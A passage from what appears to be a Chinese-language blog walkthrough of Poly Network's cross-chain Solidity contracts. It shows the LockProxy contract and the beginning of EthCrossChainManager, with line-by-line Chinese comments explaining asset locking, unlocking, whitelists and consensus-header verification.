<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line">import &quot;./../../libs/ownership/Ownable.sol&quot;;</span><br><span class="line">import &quot;./../../libs/common/ZeroCopySource.sol&quot;;</span><br><span class="line">import &quot;./../../libs/common/ZeroCopySink.sol&quot;;</span><br><span class="line">import &quot;./../../libs/utils/Utils.sol&quot;;</span><br><span class="line">import &quot;./../../libs/token/ERC20/SafeERC20.sol&quot;;</span><br><span class="line">import &quot;./../cross_chain_manager/interface/IEthCrossChainManager.sol&quot;;</span><br><span class="line">import &quot;./../cross_chain_manager/interface/IEthCrossChainManagerProxy.sol&quot;;</span><br><span class="line">contract LockProxy is Ownable &#123;</span><br><span class="line">    using SafeMath for uint;         //包含基本算数运算，以防止溢出</span><br><span class="line">    using SafeERC20 for IERC20;</span><br><span class="line"></span><br><span class="line">    struct TxArgs &#123;</span><br><span class="line">        bytes toAssetHash;        //目标链上的资产哈希</span><br><span class="line">        bytes toAddress;         //目标链上接收对应代币的字节格式的地址</span><br><span class="line">        uint256 amount;          //交易数额</span><br><span class="line">    &#125;</span><br><span class="line">    address public managerProxyContract;    //CCMP合约的地址</span><br><span class="line">    mapping(uint64 =&gt; bytes) public proxyHashMap;</span><br><span class="line">    //存储链与链之间的CCM合约之间的映射关系</span><br><span class="line">    //以目标链ID（ChainID）为键，CCM合约地址哈希为值。</span><br><span class="line">    mapping(address =&gt; mapping(uint64 =&gt; bytes)) public assetHashMap;</span><br><span class="line">    //存储链与链之间的资产映射关系.</span><br><span class="line">    //以源链资产哈希（fromAssetHash）和目标链ID（toChainID）为键，目标资产哈希(toAssetHash)为值。</span><br><span class="line">    mapping(address =&gt; bool) safeTransfer;</span><br><span class="line"></span><br><span class="line">    event SetManagerProxyEvent(address manager);</span><br><span class="line">    event BindProxyEvent(uint64 toChainId, bytes targetProxyHash);</span><br><span class="line">    event BindAssetEvent(address fromAssetHash, uint64 toChainId, bytes targetProxyHash, uint initialAmount);</span><br><span class="line">    event UnlockEvent(address toAssetHash, address toAddress, uint256 amount);</span><br><span class="line">    event LockEvent(address fromAssetHash, address fromAddress, uint64 toChainId, bytes toAssetHash, bytes toAddress, uint256 amount);</span><br><span class="line">    </span><br><span class="line">    modifier onlyManagerContract() &#123;</span><br><span class="line">        IEthCrossChainManagerProxy ieccmp = IEthCrossChainManagerProxy(managerProxyContract);</span><br><span class="line">        require(_msgSender() == ieccmp.getEthCrossChainManager(), &quot;msgSender is not EthCrossChainManagerContract&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    //getEthCrossChainManager()函数得到跨链管理合约的地址，require()的判断用来确保函数的调用者，是跨链管理合约。</span><br><span class="line">	//Unlock()函数中用到，用来确实对应的资产解锁操作，只能由跨链管理合约发出</span><br><span class="line">    </span><br><span class="line">    function setManagerProxy(address ethCCMProxyAddr) onlyOwner public &#123;</span><br><span class="line">        managerProxyContract = ethCCMProxyAddr;</span><br><span class="line">        emit SetManagerProxyEvent(managerProxyContract);</span><br><span class="line">    &#125;</span><br><span class="line">    //CCMP合约部署之后，将CCMP合约的地址赋值给managerProxyContract</span><br><span class="line">    </span><br><span class="line">    function bindProxyHash(uint64 toChainId, bytes memory targetProxyHash) onlyOwner public returns (bool) &#123;</span><br><span class="line">        proxyHashMap[toChainId] = targetProxyHash;</span><br><span class="line">        emit BindProxyEvent(toChainId, targetProxyHash);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    //存储链与链之间的CCM合约之间的映射关系</span><br><span class="line">    //以目标链ID（ChainID）为键，CCM合约哈希为值。</span><br><span class="line">    </span><br><span class="line">    function bindAssetHash(address fromAssetHash, uint64 toChainId, bytes memory toAssetHash) onlyOwner public returns (bool) &#123;</span><br><span class="line">        assetHashMap[fromAssetHash][toChainId] = toAssetHash;</span><br><span class="line">        emit BindAssetEvent(fromAssetHash, toChainId, toAssetHash, getBalanceFor(fromAssetHash));</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    //存储链与链之间的资产映射关系.</span><br><span class="line">    //以源链资产哈希（fromAssetHash）和目标链ID（toChainID）为键，目标资产哈希(toAssetHash)为值。</span><br><span class="line">    </span><br><span class="line">	//lock()函数应该由用户调用，特定数量的代币将会被锁定，ChainID目标链上的代理合约将会解锁对应的代币</span><br><span class="line">    function lock(address fromAssetHash, uint64 toChainId, bytes memory toAddress, uint256 amount) public payable returns (bool) &#123;</span><br><span class="line">        require(amount != 0, &quot;amount cannot be zero!&quot;);     //判断锁定金额不能为0</span><br><span class="line">        </span><br><span class="line">        require(_transferToContract(fromAssetHash, amount), &quot;transfer asset from fromAddress to lock_proxy contract  failed!&quot;);</span><br><span class="line">        //将对应amount数量的资产转移到LockProxy合约中</span><br><span class="line">        bytes memory toAssetHash = assetHashMap[fromAssetHash][toChainId]; //得到目标链上的资产哈希</span><br><span class="line">        require(toAssetHash.length != 0, &quot;empty illegal toAssetHash&quot;);  </span><br><span class="line">        //require()验证确保目标链上的资产哈希不为0</span><br><span class="line">        TxArgs memory txArgs = TxArgs(&#123;</span><br><span class="line">            toAssetHash: toAssetHash,</span><br><span class="line">            toAddress: toAddress,</span><br><span class="line">            amount: amount</span><br><span class="line">        &#125;);    //构造对应的交易参数</span><br><span class="line">        bytes memory txData = _serializeTxArgs(txArgs);</span><br><span class="line">        //将对应的交易参数结构体，序列化成为对应的字节数据</span><br><span class="line">        IEthCrossChainManagerProxy eccmp = IEthCrossChainManagerProxy(managerProxyContract);</span><br><span class="line">        address eccmAddr = eccmp.getEthCrossChainManager();</span><br><span class="line">        //得到对应的CCM合约的地址</span><br><span class="line">        IEthCrossChainManager eccm = IEthCrossChainManager(eccmAddr);  //实例化CCM合约</span><br><span class="line">        </span><br><span class="line">        bytes memory toProxyHash = proxyHashMap[toChainId];     //得到bytes形式的CCM合约的地址</span><br><span class="line">        require(toProxyHash.length != 0, &quot;empty illegal toProxyHash&quot;);   //确保对应bytes形式的CCM合约地址是合法的</span><br><span class="line">        require(eccm.crossChain(toChainId, toProxyHash, &quot;unlock&quot;, txData), &quot;EthCrossChainManager crossChain executed error!&quot;);</span><br><span class="line">		//调用对应的CCM跨链管理合约的跨链函数</span><br><span class="line">        emit LockEvent(fromAssetHash, _msgSender(), toChainId, toAssetHash, toAddress, amount);</span><br><span class="line">        //锁定完成，emit对应的LockEvent。</span><br><span class="line">        return true;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //modifier onlyManagerContract限制该函数只能CCM合约来调用，铸造一定数量的代币到指定的地址</span><br><span class="line">    //输入序列化的对应交易数据，源链合约地址，源链ID</span><br><span class="line">    function unlock(bytes memory argsBs, bytes memory fromContractAddr, uint64 fromChainId) onlyManagerContract public returns (bool) &#123;</span><br><span class="line">        TxArgs memory args = _deserializeTxArgs(argsBs);    //反序列化对应的字节数据为交易参数结构体</span><br><span class="line">        require(fromContractAddr.length != 0, &quot;from proxy contract address cannot be empty&quot;);  </span><br><span class="line">        //检查确保源链的CCM合约地址不为空</span><br><span class="line">        require(Utils.equalStorage(proxyHashMap[fromChainId], fromContractAddr), &quot;From Proxy contract address error!&quot;);</span><br><span class="line">   //Utils.equalStorage()函数用来比较两个字节是否相等，验证传入源链的CCM合约地址哈希是否和proxyHashMap mapping存储的一样</span><br><span class="line">        require(args.toAssetHash.length != 0, &quot;toAssetHash cannot be empty&quot;);</span><br><span class="line">        //确保目标链资产地址哈希不为空</span><br><span class="line">        address toAssetHash = Utils.bytesToAddress(args.toAssetHash);</span><br><span class="line">		//将目标链资产地址哈希，取十六进制字符串的后40位，得到目标链资产地址</span><br><span class="line">		</span><br><span class="line">        require(args.toAddress.length != 0, &quot;toAddress cannot be empty&quot;);  //确保目标链上的收款地址不为空</span><br><span class="line">        address toAddress = Utils.bytesToAddress(args.toAddress);</span><br><span class="line">        //与上面类似，将对应的字节哈希，转换为目标链上的收款地址</span><br><span class="line">        </span><br><span class="line">        require(_transferFromContract(toAssetHash, toAddress, args.amount), &quot;transfer asset from lock_proxy contract to toAddress failed!&quot;);</span><br><span class="line">        //将对应amount数量的资产从LockProxy合约转移到用户的toAddress中</span><br><span class="line">        emit UnlockEvent(toAssetHash, toAddress, args.amount);</span><br><span class="line">        //完成对应的铸造，emit对应的UnlockEvent事件</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //得到对应的账户余额</span><br><span class="line">    function getBalanceFor(address fromAssetHash) public view returns (uint256) &#123;</span><br><span class="line">        if (fromAssetHash == address(0)) &#123;</span><br><span class="line">            // return address(this).balance; // this expression would result in error: Failed to decode output: Error: insufficient data for uint256 type</span><br><span class="line">            //如果对应的源链资产哈希为空的话，证明不存在对应的代币代理合约，直接返回当前LockProxy合约的余额。</span><br><span class="line">            address selfAddr = address(this);</span><br><span class="line">            return selfAddr.balance;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">        	//否则的话，根据资产地址哈希实例化对应的ERC20代币，</span><br><span class="line">            IERC20 erc20Token = IERC20(fromAssetHash);</span><br><span class="line">            return erc20Token.balanceOf(address(this));  //返回当前合约账户的对应的ERC20代币余额</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //将用户对应的资产地址哈希，从fromAddress转移到对应的LockProxy合约中</span><br><span class="line">    function _transferToContract(address fromAssetHash, uint256 amount) internal returns (bool) &#123;</span><br><span class="line">        if (fromAssetHash == address(0)) &#123;</span><br><span class="line">            // fromAssetHash === address(0) denotes user choose to lock ether</span><br><span class="line">            // passively check if the received msg.value equals amount</span><br><span class="line">            //当对应的资产地址哈希为空的时候，代表用户转移的不是ERC20代币，是ether。</span><br><span class="line">            require(msg.value != 0, &quot;transferred ether cannot be zero!&quot;);</span><br><span class="line">            require(msg.value == amount, &quot;transferred ether is not equal to amount!&quot;);</span><br><span class="line">            //检查对应的转移的以太数量是否为对应的amount</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // make sure lockproxy contract will decline any received ether</span><br><span class="line">            require(msg.value == 0, &quot;there should be no ether transfer!&quot;);  //这里不应该有以太的转移</span><br><span class="line">            // actively transfer amount of asset from msg.sender to lock_proxy contract</span><br><span class="line">            require(_transferERC20ToContract(fromAssetHash, _msgSender(), address(this), amount), &quot;transfer erc20 asset to lock_proxy contract failed!&quot;);</span><br><span class="line">            //调用函数_transferERC20ToContract()</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    function _transferFromContract(address toAssetHash, address toAddress, uint256 amount) internal returns (bool) &#123;</span><br><span class="line">        if (toAssetHash == address(0x0000000000000000000000000000000000000000)) &#123;</span><br><span class="line">            // toAssetHash === address(0) denotes contract needs to unlock ether to toAddress</span><br><span class="line">            // convert toAddress from &#x27;address&#x27; type to &#x27;address payable&#x27; type, then actively transfer ether</span><br><span class="line">            address(uint160(toAddress)).transfer(amount);</span><br><span class="line">            //toAssetHash资产地址为空，表明合约需要解锁以太到toAddress中</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            // actively transfer amount of asset from lock_proxy contract to toAddress</span><br><span class="line">            require(_transferERC20FromContract(toAssetHash, toAddress, amount), &quot;transfer erc20 asset from lock_proxy contract to toAddress failed!&quot;);</span><br><span class="line">            //调用函数_transferERC20FromContract()</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //将对应数量的ERC20代币转移到LockProxy合约中</span><br><span class="line">    function _transferERC20ToContract(address fromAssetHash, address fromAddress, address toAddress, uint256 amount) internal returns (bool) &#123;</span><br><span class="line">         IERC20 erc20Token = IERC20(fromAssetHash);</span><br><span class="line">         //根据源链的资产地址哈希，实例化对应的ERC20代币，从用户的账户地址转移amount数量代币到LockProxy合约中</span><br><span class="line">        //  require(erc20Token.transferFrom(fromAddress, toAddress, amount), &quot;trasnfer ERC20 Token failed!&quot;);</span><br><span class="line">         erc20Token.safeTransferFrom(fromAddress, toAddress, amount);</span><br><span class="line">         return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //转移对应的amount数量的ERC20代币到对应的toAddress账户中</span><br><span class="line">    function _transferERC20FromContract(address toAssetHash, address toAddress, uint256 amount) internal returns (bool) &#123;</span><br><span class="line">         IERC20 erc20Token = IERC20(toAssetHash);</span><br><span class="line">         //根据目标链的资产地址哈希，实例化对应的ERC20代币，从LockProxy合约中转移amount数量代币到toAddress中</span><br><span class="line">        //  require(erc20Token.transfer(toAddress, amount), &quot;trasnfer ERC20 Token failed!&quot;);</span><br><span class="line">         erc20Token.safeTransfer(toAddress, amount);</span><br><span class="line">         return true;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function _serializeTxArgs(TxArgs memory args) internal pure returns (bytes memory) &#123;</span><br><span class="line">        bytes memory buff;</span><br><span class="line">        buff = abi.encodePacked(</span><br><span class="line">            ZeroCopySink.WriteVarBytes(args.toAssetHash),</span><br><span class="line">            ZeroCopySink.WriteVarBytes(args.toAddress),</span><br><span class="line">            ZeroCopySink.WriteUint255(args.amount)</span><br><span class="line">            );</span><br><span class="line">        return buff;</span><br><span class="line">    &#125;</span><br><span class="line">	//将对应的交易参数结构体，编码序列化成对应的字节数据</span><br><span class="line">    function _deserializeTxArgs(bytes memory valueBs) internal pure returns (TxArgs memory) &#123;</span><br><span class="line">        TxArgs memory args;</span><br><span class="line">        uint256 off = 0;</span><br><span class="line">        (args.toAssetHash, off) = ZeroCopySource.NextVarBytes(valueBs, off);</span><br><span class="line">        (args.toAddress, off) = ZeroCopySource.NextVarBytes(valueBs, off);</span><br><span class="line">        (args.amount, off) = ZeroCopySource.NextUint255(valueBs, off);</span><br><span class="line">        return args;</span><br><span class="line">    &#125;</span><br><span class="line">    //将对应的字节数据，解码反序列化成对应的交易参数结构体</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Cross-Chain-Manager-Contract"><a href="#Cross-Chain-Manager-Contract" class="headerlink" title="Cross Chain Manager Contract:"></a>Cross Chain Manager Contract:</h3><h4 id="EthCrossChainManager-sol"><a href="#EthCrossChainManager-sol" class="headerlink" title="EthCrossChainManager.sol"></a><code>EthCrossChainManager.sol</code></h4><p>代码github位置：polynetwork/eth-contracts/contracts/core/cross_chain_manager/logic/EthCrossChainManager.sol</p>
<p><a href="https://github.com/polynetwork/eth-contracts/blob/master/contracts/core/cross_chain_manager/logic/EthCrossChainManager.sol">https://github.com/polynetwork/eth-contracts/blob/master/contracts/core/cross_chain_manager/logic/EthCrossChainManager.sol</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.5.0;</span><br><span class="line">pragma experimental ABIEncoderV2;</span><br><span class="line"></span><br><span class="line">import &quot;./../../../libs/math/SafeMath.sol&quot;;</span><br><span class="line">import &quot;./../../../libs/common/ZeroCopySource.sol&quot;;</span><br><span class="line">import &quot;./../../../libs/common/ZeroCopySink.sol&quot;;</span><br><span class="line">import &quot;./../../../libs/utils/Utils.sol&quot;;</span><br><span class="line">import &quot;./../upgrade/UpgradableECCM.sol&quot;;</span><br><span class="line">import &quot;./../libs/EthCrossChainUtils.sol&quot;;</span><br><span class="line">import &quot;./../interface/IEthCrossChainManager.sol&quot;;</span><br><span class="line">import &quot;./../interface/IEthCrossChainData.sol&quot;;</span><br><span class="line">contract EthCrossChainManager is IEthCrossChainManager, UpgradableECCM &#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    </span><br><span class="line">    address public whiteLister;</span><br><span class="line">    mapping(address =&gt; bool) public whiteListFromContract;</span><br><span class="line">    //建立地址的白名单，以对应的地址为键，bool值代表该地址是否在白名单中</span><br><span class="line">    mapping(address =&gt; mapping(bytes =&gt; bool)) public whiteListContractMethodMap;</span><br><span class="line">    //建立可调用函数的白名单。以调用的合约，调用的函数为键，bool值代表能否调用该函数</span><br><span class="line"></span><br><span class="line">    event InitGenesisBlockEvent(uint256 height, bytes rawHeader);</span><br><span class="line">    event ChangeBookKeeperEvent(uint256 height, bytes rawHeader);</span><br><span class="line">    event CrossChainEvent(address indexed sender, bytes txId, address proxyOrAssetContract, uint64 toChainId, bytes toContract, bytes rawdata);</span><br><span class="line">    event VerifyHeaderAndExecuteTxEvent(uint64 fromChainID, bytes toContract, bytes crossChainTxHash, bytes fromChainTxHash);</span><br><span class="line">    </span><br><span class="line">    constructor(</span><br><span class="line">        address _eccd, </span><br><span class="line">        uint64 _chainId, </span><br><span class="line">        address[] memory fromContractWhiteList, </span><br><span class="line">        bytes[] memory contractMethodWhiteList</span><br><span class="line">    ) UpgradableECCM(_eccd,_chainId) public &#123;</span><br><span class="line">        whiteLister = msg.sender;   //将初始合约部署者设置为whiteLister</span><br><span class="line">        for (uint i=0;i&lt;fromContractWhiteList.length;i++) &#123;</span><br><span class="line">            whiteListFromContract[fromContractWhiteList[i]] = true;</span><br><span class="line">        &#125;// 初始部署的时候，建立对应的地址白名单。</span><br><span class="line">        </span><br><span class="line">        for (uint i=0;i&lt;contractMethodWhiteList.length;i++) &#123;</span><br><span class="line">            (address toContract,bytes[] memory methods) = abi.decode(contractMethodWhiteList[i],(address,bytes[]));</span><br><span class="line">            //将对应的字节解码成对应合约中的函数，建立对应的可调用函数的白名单</span><br><span class="line">            for (uint j=0;j&lt;methods.length;j++) &#123;</span><br><span class="line">                whiteListContractMethodMap[toContract][methods[j]] = true;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    modifier onlyWhiteLister() &#123;</span><br><span class="line">        require(msg.sender == whiteLister, &quot;Not whiteLister&quot;);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    //modifier onlyWhiteLister用来限制一些函数只有whiteLister能够调用</span><br><span class="line"></span><br><span class="line">	//只有whiteLister能够调用该函数</span><br><span class="line">    function setWhiteLister(address newWL) public onlyWhiteLister &#123;</span><br><span class="line">        require(newWL!=address(0), &quot;Can not transfer to address(0)&quot;);   //判断对应的地址不为空</span><br><span class="line">        whiteLister = newWL;   //将whiteLister设置为newWL。</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //只有whiteLister能够调用该函数</span><br><span class="line">    function setFromContractWhiteList(address[] memory fromContractWhiteList) public onlyWhiteLister &#123;</span><br><span class="line">        for (uint i=0;i&lt;fromContractWhiteList.length;i++) &#123;</span><br><span class="line">            whiteListFromContract[fromContractWhiteList[i]] = true;</span><br><span class="line">        &#125;</span><br><span class="line">        //将一些地址加入地址白名单中</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">     //只有whiteLister能够调用该函数</span><br><span class="line">    function removeFromContractWhiteList(address[] memory fromContractWhiteList) public onlyWhiteLister &#123;</span><br><span class="line">        for (uint i=0;i&lt;fromContractWhiteList.length;i++) &#123;</span><br><span class="line">            whiteListFromContract[fromContractWhiteList[i]] = false;</span><br><span class="line">        &#125;</span><br><span class="line">        //将一些地址从地址白名单之中移除</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //只有whiteLister能够调用该函数</span><br><span class="line">    function setContractMethodWhiteList(bytes[] memory contractMethodWhiteList) public onlyWhiteLister &#123;</span><br><span class="line">        for (uint i=0;i&lt;contractMethodWhiteList.length;i++) &#123;</span><br><span class="line">            (address toContract,bytes[] memory methods) = abi.decode(contractMethodWhiteList[i],(address,bytes[]));   //将对应的数据进行解码</span><br><span class="line">            for (uint j=0;j&lt;methods.length;j++) &#123;</span><br><span class="line">                whiteListContractMethodMap[toContract][methods[j]] = true;</span><br><span class="line">            &#125;</span><br><span class="line">            //将一些合约中的可调用函数加入白名单之中</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    //只有whiteLister能够调用该函数</span><br><span class="line">    function removeContractMethodWhiteList(bytes[] memory contractMethodWhiteList) public onlyWhiteLister &#123;</span><br><span class="line">        for (uint i=0;i&lt;contractMethodWhiteList.length;i++) &#123;</span><br><span class="line">            (address toContract,bytes[] memory methods) = abi.decode(contractMethodWhiteList[i],(address,bytes[]));   //将对应的数据进行解码</span><br><span class="line">            for (uint j=0;j&lt;methods.length;j++) &#123;</span><br><span class="line">                whiteListContractMethodMap[toContract][methods[j]] = false;</span><br><span class="line">            &#125;</span><br><span class="line">            //将一些合约中的可调用函数从白名单中移除</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /* @notice              sync Poly chain genesis block header to smart contrat</span><br><span class="line">    *  @dev                 this function can only be called once, nextbookkeeper of rawHeader can&#x27;t be empty</span><br><span class="line">    *  @param rawHeader     Poly chain genesis block raw header or raw Header including switching consensus peers info</span><br><span class="line">    */</span><br><span class="line">    //同步Poly Chain的原始区块头到CCD智能合约，该函数只能初始被调用一次，保存共识验证者公钥</span><br><span class="line">    function initGenesisBlock(bytes memory rawHeader, bytes memory pubKeyList) whenNotPaused public returns(bool) &#123;</span><br><span class="line">        IEthCrossChainData eccd = IEthCrossChainData(EthCrossChainDataAddress);</span><br><span class="line">        //实例化CCD合约</span><br><span class="line"></span><br><span class="line">        require(eccd.getCurEpochConPubKeyBytes().length == 0, &quot;EthCrossChainData contract has already been initialized!&quot;);</span><br><span class="line">        //判断CCD合约之前有无被初始化过，获取存储的共识验证者的公钥所对应的字节，若其长度为0，则说明CCD合约未被初始化</span><br><span class="line">        </span><br><span class="line">        ECCUtils.Header memory header = ECCUtils.deserializeHeader(rawHeader);</span><br><span class="line">        //将字节形式的rawHeader区块头，去序列化为header结构体</span><br><span class="line">        </span><br><span class="line">        (bytes20 nextBookKeeper, address[] memory keepers) = ECCUtils.verifyPubkey(pubKeyList);</span><br><span class="line">        require(header.nextBookkeeper == nextBookKeeper, &quot;NextBookers illegal&quot;);</span><br><span class="line">        //从共识验证者的公钥，得到nextBookKeeper，与区块头中保存的nextBookKeeper进行对比，验证对应的公钥是否合法</span><br><span class="line">        //并计算出对应的共识验证者的地址keepers</span><br><span class="line">        </span><br><span class="line">        require(eccd.putCurEpochStartHeight(header.height), &quot;Save Poly chain current epoch start height to Data contract failed!&quot;);</span><br><span class="line">        //记录当前epoch区块的起始高度，并要将其保存到CCD合约之中</span><br><span class="line">        require(eccd.putCurEpochConPubKeyBytes(ECCUtils.serializeKeepers(keepers)), &quot;Save Poly chain current epoch book keepers to Data contract failed!&quot;);</span><br><span class="line">        //将共识验证者的公钥序列化为bytes形式，并将其保存到CCD合约之中</span><br><span class="line"></span><br><span class="line">        emit InitGenesisBlockEvent(header.height, rawHeader);</span><br><span class="line">        //emit对应的事件，包含原始区块头的高度，和原始区块头的信息</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //改变CCD合约中保存的区块高度，共识验证者公钥对应的字节，并存储入CCD合约</span><br><span class="line">    function changeBookKeeper(bytes memory rawHeader, bytes memory pubKeyList, bytes memory sigList) whenNotPaused public returns(bool) &#123;</span><br><span class="line">        ECCUtils.Header memory header = ECCUtils.deserializeHeader(rawHeader);</span><br><span class="line">        //将对应的区块头，解码为结构体形式的区块头Header</span><br><span class="line">        IEthCrossChainData eccd = IEthCrossChainData(EthCrossChainDataAddress);</span><br><span class="line">        //实例化对应的CCD合约</span><br><span class="line"></span><br><span class="line">        uint64 curEpochStartHeight = eccd.getCurEpochStartHeight();</span><br><span class="line">        require(header.height &gt; curEpochStartHeight, &quot;The height of header is lower than current epoch start height!&quot;);</span><br><span class="line">        //调用CCD合约getCurEpochStartHeight()函数，获取之前保存的区块高度</span><br><span class="line">        //require()用来确保传入的区块头对应的高度要高于对应CCD合约中保存的区块头高度</span><br><span class="line"></span><br><span class="line">        require(header.nextBookkeeper != bytes20(0), &quot;The nextBookKeeper of header is empty&quot;);</span><br><span class="line">        //确保rawHeader是关键区块头，包含切换共识验证者的信息</span><br><span class="line"></span><br><span class="line">        address[] memory polyChainBKs = ECCUtils.deserializeKeepers(eccd.getCurEpochConPubKeyBytes());</span><br><span class="line">        //从CCD合约中获取保存的共识验证者公钥的字节，将字节解码为对应的共识验证者的地址</span><br><span class="line">        uint n = polyChainBKs.length;</span><br><span class="line">        //得到对应的共识验证者的数量</span><br><span class="line">        require(ECCUtils.verifySig(rawHeader, sigList, polyChainBKs, n - (n - 1) / 3), &quot;Verify signature failed!&quot;);</span><br><span class="line">        //poly chain上的区块是由共识验证者投票决定。</span><br><span class="line">        //调用函数，验证共识验证者的签名，签名者必须大于2/3共识验证者的数目，验证该区块头是否合法</span><br><span class="line">        </span><br><span class="line">        // Convert pubKeyList into ethereum address format and make sure the compound address from the converted ethereum addresses</span><br><span class="line">        // equals passed in header.nextBooker</span><br><span class="line">        (bytes20 nextBookKeeper, address[] memory keepers) = ECCUtils.verifyPubkey(pubKeyList);</span><br><span class="line">        require(header.nextBookkeeper == nextBookKeeper, &quot;NextBookers illegal&quot;);</span><br><span class="line">         //从共识验证者的公钥，得到nextBookKeeper，与区块头中保存的nextBookKeeper进行对比，验证对应的公钥是否合法</span><br><span class="line"></span><br><span class="line">        require(eccd.putCurEpochStartHeight(header.height), &quot;Save MC LatestHeight to Data contract failed!&quot;);</span><br><span class="line">        //将新的当前epoch的区块高度存入CCD合约之中</span><br><span class="line">        require(eccd.putCurEpochConPubKeyBytes(ECCUtils.serializeKeepers(keepers)), &quot;Save Poly chain book keepers bytes to Data contract failed!&quot;);</span><br><span class="line">        //将新的共识验证者地址序列化，成对应的字节，并存入CCD合约之中</span><br><span class="line">        </span><br><span class="line">        emit ChangeBookKeeperEvent(header.height, rawHeader);</span><br><span class="line">        //emit对应的事件，表示以太坊上更改了Poly chain上的共识验证者地址</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    //源链：ERC20代币跨链到其它链上，该函数将tx对应的event发布到区块链上</span><br><span class="line">    //输入的参数：目标链ID，目标链上的智能合约地址，目标链上准备调用的函数方法method，以及交易数据</span><br><span class="line">    function crossChain(uint64 toChainId, bytes calldata toContract, bytes calldata method, bytes calldata txData) whenNotPaused external returns (bool) &#123;</span><br><span class="line">        require(whiteListFromContract[msg.sender],&quot;Invalid from contract&quot;);</span><br><span class="line">        //进行判断，只允许白名单中的合约地址能够调用该函数</span><br><span class="line">        IEthCrossChainData eccd = IEthCrossChainData(EthCrossChainDataAddress);</span><br><span class="line">        //实例化对应的CCD合约</span><br><span class="line">        </span><br><span class="line">        uint256 txHashIndex = eccd.getEthTxHashIndex();</span><br><span class="line">        //得到对应跨链交易哈希的index，用来区分两个交易</span><br><span class="line">        </span><br><span class="line">        bytes memory paramTxHash = Utils.uint256ToBytes(txHashIndex);</span><br><span class="line">        //将对应的uint256,转化为bytes形式，用于构造rawParam。</span><br><span class="line"></span><br><span class="line">        bytes memory rawParam = abi.encodePacked(ZeroCopySink.WriteVarBytes(paramTxHash),</span><br><span class="line">            ZeroCopySink.WriteVarBytes(abi.encodePacked(sha256(abi.encodePacked(address(this), paramTxHash)))),</span><br><span class="line">            ZeroCopySink.WriteVarBytes(Utils.addressToBytes(msg.sender)),</span><br><span class="line">            ZeroCopySink.WriteUint64(toChainId),</span><br><span class="line">            ZeroCopySink.WriteVarBytes(toContract),</span><br><span class="line">            ZeroCopySink.WriteVarBytes(method),</span><br><span class="line">            ZeroCopySink.WriteVarBytes(txData)</span><br><span class="line">        );</span><br><span class="line">        //构造rawParam交易的数据，并将它的哈希保存，作为交易存在的证明</span><br><span class="line">        </span><br><span class="line">        require(eccd.putEthTxHash(keccak256(rawParam)), &quot;Save ethTxHash by index to Data contract failed!&quot;);</span><br><span class="line">        //将对应的交易信息取哈希，将其存入CCD合约中的映射</span><br><span class="line"></span><br><span class="line">        emit CrossChainEvent(tx.origin, paramTxHash, msg.sender, toChainId, toContract, rawParam);</span><br><span class="line">        //emit对应的跨链事件，表示以太坊网络通过Poly Chain向其他公共链发送跨链请求</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">    /* @notice              Verify Poly chain header and proof, execute the cross chain tx from Poly chain to Ethereum</span><br><span class="line">    *  @param proof         Poly chain tx merkle proof</span><br><span class="line">    *  @param rawHeader     The header containing crossStateRoot to verify the above tx merkle proof</span><br><span class="line">    *  @param headerProof   The header merkle proof used to verify rawHeader</span><br><span class="line">    *  @param curRawHeader  Any header in current epoch consensus of Poly chain</span><br><span class="line">    *  @param headerSig     The coverted signature veriable for solidity derived from Poly chain consensus nodes&#x27; signature</span><br><span class="line">    *                       used to verify the validity of curRawHeader</span><br><span class="line">    *  @return              true or false</span><br><span class="line">    */</span><br><span class="line">    //目标链：验证Poly Chain上的区块头和对应的交易证明，在以太坊上执行来自Poly Chain的跨链交易</span><br><span class="line">    //输入：Poly Chain上的交易证明，包含验证poly chain上交易的crossStateRoot的区块头</span><br><span class="line">    //，，poly chain上的共识验证者的签名</span><br><span class="line">    function verifyHeaderAndExecuteTx(bytes memory proof, bytes memory rawHeader, bytes memory headerProof, bytes memory curRawHeader,bytes memory headerSig) whenNotPaused public returns (bool)&#123;</span><br><span class="line">        ECCUtils.Header memory header = ECCUtils.deserializeHeader(rawHeader);</span><br><span class="line">        //将对应的rawHeader解码成对应的Header结构体</span><br><span class="line">     </span><br><span class="line">        IEthCrossChainData eccd = IEthCrossChainData(EthCrossChainDataAddress);</span><br><span class="line">        //实例化对应的CCD合约</span><br><span class="line"></span><br><span class="line">        address[] memory polyChainBKs = ECCUtils.deserializeKeepers(eccd.getCurEpochConPubKeyBytes());</span><br><span class="line">		